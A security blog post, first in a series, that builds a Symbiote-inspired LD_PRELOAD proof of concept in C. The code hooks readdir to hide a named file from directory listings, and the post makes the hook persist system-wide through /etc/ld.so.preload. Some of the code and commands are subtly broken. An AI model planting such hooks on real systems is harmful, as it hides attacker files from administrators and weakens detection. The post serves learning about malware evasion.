<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1) | 0x73796C31</title><meta name=keywords content><meta name=description content="Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the &ldquo;Nearly-Impossible-to-Detect Linux Threat&rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&rsquo;ve started to research it.
I highly advise you to read through these articles first before we begin with the actual post:"><meta name=author content="Dimitar Ganev"><link rel=canonical href=https://sy1.sh/posts/dynamic-linker-hijacking-experiments/><link crossorigin=anonymous href=/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://sy1.sh/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://sy1.sh/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://sy1.sh/favicon-32x32.png><link rel=apple-touch-icon href=https://sy1.sh/apple-touch-icon.png><link rel=mask-icon href=https://sy1.sh/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)"><meta property="og:description" content="Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the &ldquo;Nearly-Impossible-to-Detect Linux Threat&rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&rsquo;ve started to research it.
I highly advise you to read through these articles first before we begin with the actual post:"><meta property="og:type" content="article"><meta property="og:url" content="https://sy1.sh/posts/dynamic-linker-hijacking-experiments/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-10-02T21:45:03+03:00"><meta property="article:modified_time" content="2022-10-02T21:45:03+03:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)"><meta name=twitter:description content="Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the &ldquo;Nearly-Impossible-to-Detect Linux Threat&rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&rsquo;ve started to research it.
I highly advise you to read through these articles first before we begin with the actual post:"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"Posts","item":"https://sy1.sh/posts/"},{"@type":"ListItem","position":3,"name":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)","item":"https://sy1.sh/posts/dynamic-linker-hijacking-experiments/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)","name":"Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)","description":"Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the \u0026ldquo;Nearly-Impossible-to-Detect Linux Threat\u0026rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I\u0026rsquo;ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:","keywords":[],"articleBody":" Series (this one) Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2) Using DNS as C2 Communication - Evasive Techniques (Part 3) Overview Recently I heard about a new malware called Symbiote, which the researches are calling the “Nearly-Impossible-to-Detect Linux Threat”. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I’ve started to research it.\nI highly advise you to read through these articles first before we begin with the actual post:\nHijack Execution Flow: Dynamic Linker Hijacking What Is the LD_PRELOAD? What is a Shared Library? Implementation I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I’ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.\nWhat do we need first and how to hide a file from lets say a command like ls? With a little bit of investigating of how the ls works internally through the source code and the linux manual page We can see that internally we have a function that is called print_dir. I’ve truncated the comments of the original source code.\n... static void print_dir (char const *name, char const *realname, bool command_line_arg) ... If we continue further down the function we can see the loop that actually iterates over the files\n... while (true) { errno = 0; next = readdir (dirp); // Here we can see that the loop iterates over readdir as long // as the pointer that readdir returns isn't null and the errno != 0 if (next) { if (! file_ignored (next-\u003ed_name)) // we can see here that it the filename is // taken from the next variable, lets look through the source code of `readdir` { ... Let’s confirm that by invoking nm this will show us the dynamic symbols that are being loaded from shared libs.\n$ nm -D /usr/bin/ls | grep \"readdir\" U readdir@GLIBC_2.2.5 Now I concluded that I need to search into the source code of readdir which is located here and the linux manual page. The description more or less describes exactly what we concluded from the source code of ls.c. Lets see where we set that d_name variable.\n#include struct dirent *readdir(DIR *dirp); // Signature of the readdir struct dirent { ino_t d_ino; /* Inode number */ off_t d_off; /* Not an offset; see below */ unsigned short d_reclen; /* Length of this record */ unsigned char d_type; /* Type of file; not supported by all filesystem types */ char d_name[256]; /* Null-terminated filename */ }; ⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the dirent structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that d_name will exists since this field must be implemented on all POSIX systems.\nAlright, let’s start implementing our own function readdir that we will wrap the original one with.\nintercept_readdir.c\n#define _GNU_SOURCE #include // Including the Directory Entry structure // The dynamic linking header file so we can use the dlsym // which will give us the address for the readdir symbol #include #include // So we can use the strstr struct dirent *readdir(DIR *dirp) { struct *(handle)(DIR *); // https://man7.org/linux/man-pages/man3/dlsym.3.html // Search for RTLD_NEXT, basically it allow us to wrap // the original function handle = dlsym(RTLD_NEXT, \"readdir\") struct dirent *dp; // Iterating over the return values of our original `readdir` while((dp = handle(dirp))) { // if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-\u003ed_name`) // break the loop and go to the next entry, essentially skipping our file. if(strstr(dp-\u003ed_name, \"syl.lys\") == 0) break; } return dp; } This is what our final version of wrapper for readdir would look like. Now let’s try to compile it.\n$ gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl Flags:\nfPIC -shared creates a shared object -D_GNU_SOURCE flag / _GNU_SOURCE - TLDR: We need it for RTLD_NEXT -ldl Now that we have shared object (*.so) file lets see how to use it in action.\nHow to overwrite the exported symbols? LD_PRELOAD What is LD_PRELOAD? I advise you to read that first to get a better understanding of how it works.\nThe next thing that we are going to do is to test our shared library and see if it works. Lets run ls with our libhidemyfile.so loaded before anything else.\n$ ls libhidemyfile.so syl.lys $ LD_PRELOAD=./libhidemyfile.so ls libhidemyfile.so As you can see we successfully implement a shared library that hides our file from ls, and not only that command, every command that uses readdir won’t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing LD_PRELOAD in front of every command.\n/etc/ld.so.preload If you read carefully the man pages for LD_PRELOAD you should know that you won’t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.\nInstead we are going to use the /etc/ld.so.preload which does not suffer from these restrictions. This suffers from requiring root privileges but c’mon.. if you are here you will get those!\nWe first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.\n$ sudo mv ./libhidemyfile.so /lib/libhidemyfile.so Then we just need to place our library dir in ld.so.preload file.\n$ sudo echo \"/lib/libhidemyfile.so\" \u003e /etc/ld.so.preload And if everything is good, executing ls or any of its aliases will hide our file from the output. Let’s verify this by using ldd\n$ ldd /bin/ls linux-vdso.so.1 (0x00007ffc0c8e2000) /lib/libhidemyfile.so (0x00007f00e59e4000) \u003c--- Here it is! libselinux.so.1 =\u003e /lib64/libselinux.so.1 (0x00007f00e5997000) libcap.so.2 =\u003e /lib64/libcap.so.2 (0x00007f00e598d000) libc.so.6 =\u003e /lib64/libc.so.6 (0x00007f00e5600000) libpcre2-8.so.0 =\u003e /lib64/libpcre2-8.so.0 (0x00007f00e58f0000) /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000) For your convenience I’ve setup a Docker container that you can use with ld.so.preload setup\n$ docker run -it --rm sylly/ctf_findme End If you reached here, thank you so much for the read. In the next part I will try to “completely” hide it from the system because now if we cat it despite not “reading” it in the directory would print us the contents of the file, but that will be the subject of the next post.\nFull Source Code\nResources This post wouldn’t be possible without:\nhttps://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/ https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf https://attack.mitre.org/techniques/T1574/006/ https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/ https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/ https://blog.jessfraz.com/post/ld_preload/ ","wordCount":"1112","inLanguage":"en","datePublished":"2022-10-02T21:45:03+03:00","dateModified":"2022-10-02T21:45:03+03:00","author":{"@type":"Person","name":"Dimitar Ganev"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sy1.sh/posts/dynamic-linker-hijacking-experiments/"},"publisher":{"@type":"Organization","name":"0x73796C31","logo":{"@type":"ImageObject","url":"https://sy1.sh/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sy1.sh accesskey=h title="0x73796C31 (Alt + H)">0x73796C31</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://sy1.sh/posts/ title=Archive><span>Archive</span></a></li><li><a href=https://sy1.sh/cv title=CV><span>CV</span></a></li><li><a href=https://sy1.sh/writeups/ title=Write-ups><span>Write-ups</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://sy1.sh>Home</a>&nbsp;»&nbsp;<a href=https://sy1.sh/posts/>Posts</a></div><h1 class=post-title>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 1)</h1><div class=post-meta><span title='2022-10-02 21:45:03 +0300 +0300'>2022-10-02</span>&nbsp;·&nbsp;6 min&nbsp;·&nbsp;Dimitar Ganev&nbsp;|&nbsp;<a href=https://github.com/syrull/syrull.github.io/tree/main/content/posts/dynamic-linker-hijacking-experiments.md rel="noopener noreferrer" target=_blank>Suggest Changes</a></div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><ul><li><a href=#series aria-label=Series>Series</a></li></ul><li><a href=#overview aria-label=Overview>Overview</a></li><li><a href=#implementation aria-label=Implementation>Implementation</a></li><li><a href=#how-to-overwrite-the-exported-symbols-ld_preload aria-label="How to overwrite the exported symbols? LD_PRELOAD">How to overwrite the exported symbols? <code>LD_PRELOAD</code></a><ul><li><a href=#etcldsopreload aria-label=/etc/ld.so.preload>/etc/ld.so.preload</a></li></ul></li><li><a href=#end aria-label=End>End</a></li><li><a href=#resources aria-label=Resources>Resources</a></li></ul></div></details></div><div class=post-content><p><img loading=lazy src=/dyn-link-hijack/dynlinkhijack.png alt=cover></p><h2 id=series>Series<a hidden class=anchor aria-hidden=true href=#series>#</a></h2><ol><li>(this one)</li><li><a href=https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)</a></li><li><a href=https://sy1.sh/posts/dns-c2-communcation/>Using DNS as C2 Communication - Evasive Techniques (Part 3)</a></li></ol><h1 id=overview>Overview<a hidden class=anchor aria-hidden=true href=#overview>#</a></h1><p>Recently I heard about a new malware called <a href=https://blogs.blackberry.com/en/2022/06/symbiote-a-new-nearly-impossible-to-detect-linux-threat>Symbiote</a>, which the researches are calling the &ldquo;Nearly-Impossible-to-Detect Linux Threat&rdquo;. I was very intrigued by how that malware is being implemented and how it works internally to remain undetected, so naturally I&rsquo;ve started to research it.</p><p>I highly advise you to read through these articles first before we begin with the actual post:</p><ul><li><a href=https://attack.mitre.org/techniques/T1574/006/>Hijack Execution Flow: Dynamic Linker Hijacking</a></li><li><a href=https://www.baeldung.com/linux/ld_preload-trick-what-is>What Is the LD_PRELOAD?</a></li><li><a href=https://tldp.org/HOWTO/Program-Library-HOWTO/shared-libraries.html>What is a Shared Library?</a></li></ul><h1 id=implementation>Implementation<a hidden class=anchor aria-hidden=true href=#implementation>#</a></h1><p>I decided to implement a very simple alternative of the evasive techniques that this malware uses just as a proof of concept and if you already read the articles that I&rsquo;ve linked, it is apparent that we have to implement a shared library, that will override some symbols defined in the Linux Kernel.</p><p>What do we need first and how to hide a file from lets say a command like <code>ls</code>? With a little bit of investigating of how the <code>ls</code> works internally through the <a href=https://github.com/coreutils/coreutils/blob/master/src/ls.c>source code</a> and the <a href=https://man7.org/linux/man-pages/man1/ls.1.html>linux manual page</a>
We can see that internally we have a function that is called <code>print_dir</code>. I&rsquo;ve truncated the comments of the original source code.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl><span class=k>static</span> <span class=kt>void</span>
</span></span><span class=line><span class=cl><span class=nf>print_dir</span> <span class=p>(</span><span class=kt>char</span> <span class=k>const</span> <span class=o>*</span><span class=n>name</span><span class=p>,</span> <span class=kt>char</span> <span class=k>const</span> <span class=o>*</span><span class=n>realname</span><span class=p>,</span> <span class=kt>bool</span> <span class=n>command_line_arg</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>...</span>
</span></span></code></pre></div><p>If we continue further down the function we can see the loop that actually iterates over the files</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=p>...</span>
</span></span><span class=line><span class=cl> <span class=k>while</span> <span class=p>(</span><span class=nb>true</span><span class=p>)</span>
</span></span><span class=line><span class=cl>   <span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=n>errno</span> <span class=o>=</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>     <span class=n>next</span> <span class=o>=</span> <span class=nf>readdir</span> <span class=p>(</span><span class=n>dirp</span><span class=p>);</span> <span class=c1>// Here we can see that the loop iterates over readdir as long
</span></span></span><span class=line><span class=cl><span class=c1></span>     <span class=c1>// as the pointer that readdir returns isn&#39;t null and the errno != 0
</span></span></span><span class=line><span class=cl><span class=c1></span>     <span class=k>if</span> <span class=p>(</span><span class=n>next</span><span class=p>)</span>
</span></span><span class=line><span class=cl>       <span class=p>{</span>
</span></span><span class=line><span class=cl>         <span class=k>if</span> <span class=p>(</span><span class=o>!</span> <span class=nf>file_ignored</span> <span class=p>(</span><span class=n>next</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>))</span> <span class=c1>// we can see here that it the filename is
</span></span></span><span class=line><span class=cl><span class=c1></span>         <span class=c1>// taken from the next variable, lets look through the source code of `readdir`
</span></span></span><span class=line><span class=cl><span class=c1></span>           <span class=p>{</span>
</span></span><span class=line><span class=cl>     <span class=p>...</span>
</span></span></code></pre></div><p>Let&rsquo;s confirm that by invoking <code>nm</code> this will show us the dynamic symbols that are being loaded from shared libs.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> nm -D /usr/bin/ls <span class=p>|</span> grep <span class=s2>&#34;readdir&#34;</span>
</span></span><span class=line><span class=cl><span class=go>                 U readdir@GLIBC_2.2.5
</span></span></span></code></pre></div><p>Now I concluded that I need to search into the source code of <code>readdir</code> which is located <a href=https://github.com/torvalds/linux/blob/master/fs/readdir.c>here</a> and the <a href=https://man7.org/linux/man-pages/man3/readdir.3.html>linux manual page</a>. The description more or less describes exactly what we concluded from the source code of <code>ls.c</code>. Lets see where we set that <code>d_name</code> variable.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dirent.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=nf>readdir</span><span class=p>(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>);</span> <span class=c1>// Signature of the readdir
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>ino_t</span>          <span class=n>d_ino</span><span class=p>;</span>       <span class=cm>/* Inode number */</span>
</span></span><span class=line><span class=cl>    <span class=kt>off_t</span>          <span class=n>d_off</span><span class=p>;</span>       <span class=cm>/* Not an offset; see below */</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>short</span> <span class=n>d_reclen</span><span class=p>;</span>    <span class=cm>/* Length of this record */</span>
</span></span><span class=line><span class=cl>    <span class=kt>unsigned</span> <span class=kt>char</span>  <span class=n>d_type</span><span class=p>;</span>      <span class=cm>/* Type of file; not supported
</span></span></span><span class=line><span class=cl><span class=cm>                                    by all filesystem types */</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span>           <span class=n>d_name</span><span class=p>[</span><span class=mi>256</span><span class=p>];</span> <span class=cm>/* Null-terminated filename */</span>
</span></span><span class=line><span class=cl><span class=p>};</span>
</span></span></code></pre></div><blockquote><p>⚠️ This reverse engineering/looking up the code might be a little bit tricky because of the different implementations of the <code>dirent</code> structure, if you look through some other source codes you may look at some slightly different structures. In this case the number of chars in the array is 256 but that might change to some other values. And you can always count that <code>d_name</code> will exists since this field must be implemented on all POSIX systems.</p></blockquote><p>Alright, let&rsquo;s start implementing our own function <code>readdir</code> that we will wrap the original one with.</p><p><a href=https://github.com/syrull/evasive_techniques/blob/main/Part_1_readdir/intercept_readdir.c>intercept_readdir.c</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#define _GNU_SOURCE
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;dirent.h&gt; // Including the Directory Entry structure</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span><span class=c1>// The dynamic linking header file so we can use the dlsym
</span></span></span><span class=line><span class=cl><span class=c1>// which will give us the address for the readdir symbol
</span></span></span><span class=line><span class=cl><span class=c1></span><span class=cp>#include</span> <span class=cpf>&lt;dlfcn.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt; // So we can use the strstr</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=nf>readdir</span><span class=p>(</span><span class=n>DIR</span> <span class=o>*</span><span class=n>dirp</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=o>*</span><span class=p>(</span><span class=n>handle</span><span class=p>)(</span><span class=n>DIR</span> <span class=o>*</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=c1>// https://man7.org/linux/man-pages/man3/dlsym.3.html
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Search for RTLD_NEXT, basically it allow us to wrap
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// the original function
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=n>handle</span> <span class=o>=</span> <span class=nf>dlsym</span><span class=p>(</span><span class=n>RTLD_NEXT</span><span class=p>,</span> <span class=s>&#34;readdir&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>struct</span> <span class=n>dirent</span> <span class=o>*</span><span class=n>dp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1>// Iterating over the return values of our original `readdir`
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>while</span><span class=p>((</span><span class=n>dp</span> <span class=o>=</span> <span class=nf>handle</span><span class=p>(</span><span class=n>dirp</span><span class=p>)))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=c1>// if our `needle`(our file `syl.lys`) is found in the `haystack`(`dp-&gt;d_name`)
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=c1>// break the loop and go to the next entry, essentially skipping our file.
</span></span></span><span class=line><span class=cl><span class=c1></span>        <span class=k>if</span><span class=p>(</span><span class=nf>strstr</span><span class=p>(</span><span class=n>dp</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span> <span class=s>&#34;syl.lys&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>dp</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>This is what our final version of wrapper for <code>readdir</code> would look like. Now let&rsquo;s try to compile it.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> gcc libhidemyfile.c -fPIC -shared -o libhidemyfile.so -ldl
</span></span></code></pre></div><p>Flags:</p><ul><li><a href=https://stackoverflow.com/questions/5311515/gcc-fpic-option>fPIC</a></li><li><code>-shared</code> creates a shared object</li><li><a href=https://stackoverflow.com/questions/8836707/explanation-of-d-gnu-source-why-to-use-it-and-when>-D_GNU_SOURCE flag / _GNU_SOURCE</a> - TLDR: We need it for <code>RTLD_NEXT</code></li><li><a href=https://ubuntuforums.org/archive/index.php/t-1054717.html>-ldl</a></li></ul><p>Now that we have shared object (*.so) file lets see how to use it in action.</p><h1 id=how-to-overwrite-the-exported-symbols-ld_preload>How to overwrite the exported symbols? <code>LD_PRELOAD</code><a hidden class=anchor aria-hidden=true href=#how-to-overwrite-the-exported-symbols-ld_preload>#</a></h1><ul><li><a href=https://man7.org/linux/man-pages/man8/ld.so.8.html>What is LD_PRELOAD?</a></li></ul><p>I advise you to read that first to get a better understanding of how it works.</p><p>The next thing that we are going to do is to test our shared library and see if it works. Lets run <code>ls</code> with our <code>libhidemyfile.so</code> loaded before anything else.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> ls
</span></span><span class=line><span class=cl><span class=go>libhidemyfile.so  syl.lys
</span></span></span><span class=line><span class=cl><span class=go></span><span class=gp>$</span> <span class=nv>LD_PRELOAD</span><span class=o>=</span>./libhidemyfile.so ls
</span></span><span class=line><span class=cl><span class=go>libhidemyfile.so
</span></span></span></code></pre></div><p>As you can see we successfully implement a shared library that hides our file from <code>ls</code>, and not only that command, every command that uses <code>readdir</code> won&rsquo;t be able to list our file as long as we load our shared library. So in that case we must think of a persistent way of how to load it without typing <code>LD_PRELOAD</code> in front of every command.</p><h2 id=etcldsopreload>/etc/ld.so.preload<a hidden class=anchor aria-hidden=true href=#etcldsopreload>#</a></h2><p>If you read carefully the man pages for <code>LD_PRELOAD</code> you should know that you won&rsquo;t be able to override functions in the standard search directories without properly setting your set-user-ID permissions.</p><p>Instead we are going to use the <code>/etc/ld.so.preload</code> which does not suffer from these restrictions. This suffers from requiring root privileges but c&rsquo;mon.. if you are here you will get those!</p><p>We first need to move our shared library file in some root directory, preferably /lib/ since..it is a library.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> sudo mv ./libhidemyfile.so /lib/libhidemyfile.so
</span></span></code></pre></div><p>Then we just need to place our library dir in <code>ld.so.preload</code> file.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> sudo <span class=nb>echo</span> <span class=s2>&#34;/lib/libhidemyfile.so&#34;</span> &gt; /etc/ld.so.preload
</span></span></code></pre></div><p>And if everything is good, executing <code>ls</code> or any of its aliases will hide our file from the output. Let&rsquo;s verify this by using <code>ldd</code></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> ldd /bin/ls
</span></span><span class=line><span class=cl><span class=go>        linux-vdso.so.1 (0x00007ffc0c8e2000)
</span></span></span><span class=line><span class=cl><span class=go>        /lib/libhidemyfile.so (0x00007f00e59e4000) &lt;--- Here it is!
</span></span></span><span class=line><span class=cl><span class=go>        libselinux.so.1 =&gt; /lib64/libselinux.so.1 (0x00007f00e5997000)
</span></span></span><span class=line><span class=cl><span class=go>        libcap.so.2 =&gt; /lib64/libcap.so.2 (0x00007f00e598d000)
</span></span></span><span class=line><span class=cl><span class=go>        libc.so.6 =&gt; /lib64/libc.so.6 (0x00007f00e5600000)
</span></span></span><span class=line><span class=cl><span class=go>        libpcre2-8.so.0 =&gt; /lib64/libpcre2-8.so.0 (0x00007f00e58f0000)
</span></span></span><span class=line><span class=cl><span class=go>        /lib64/ld-linux-x86-64.so.2 (0x00007f00e5a0f000)
</span></span></span></code></pre></div><p>For your convenience I&rsquo;ve setup a Docker container that you can use with <code>ld.so.preload</code> setup</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-console data-lang=console><span class=line><span class=cl><span class=gp>$</span> docker run -it --rm sylly/ctf_findme
</span></span></code></pre></div><h1 id=end>End<a hidden class=anchor aria-hidden=true href=#end>#</a></h1><p>If you reached here, thank you so much for the read. In the next part I will try to &ldquo;completely&rdquo; hide it from the system because now if we <code>cat</code> it despite not &ldquo;reading&rdquo; it in the directory would print us the contents of the file, but that will be the subject of the next post.</p><p><a href=https://github.com/syrull/evasive_techniques/blob/main/Part_1_readdir/>Full Source Code</a></p><h1 id=resources>Resources<a hidden class=anchor aria-hidden=true href=#resources>#</a></h1><p>This post wouldn&rsquo;t be possible without:</p><ul><li><a href=https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/>https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/</a></li><li><a href=https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf>https://www.exploit-db.com/docs/english/31687-dynamic-link-library-hijacking.pdf</a></li><li><a href=https://attack.mitre.org/techniques/T1574/006/>https://attack.mitre.org/techniques/T1574/006/</a></li><li><a href=https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/>https://sysdig.com/blog/hiding-linux-processes-for-fun-and-profit/</a></li><li><a href=https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/>https://www.cadosecurity.com/linux-attack-techniques-dynamic-linker-hijacking-with-ld-preload/</a></li><li><a href=https://blog.jessfraz.com/post/ld_preload/>https://blog.jessfraz.com/post/ld_preload/</a></li></ul></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://sy1.sh/posts/dynamic-linker-hijacking-experiments-2/><span class=title>« Prev</span><br><span>Dynamic Linker Hijacking Experiments - Evasive Techniques (Part 2)</span></a>
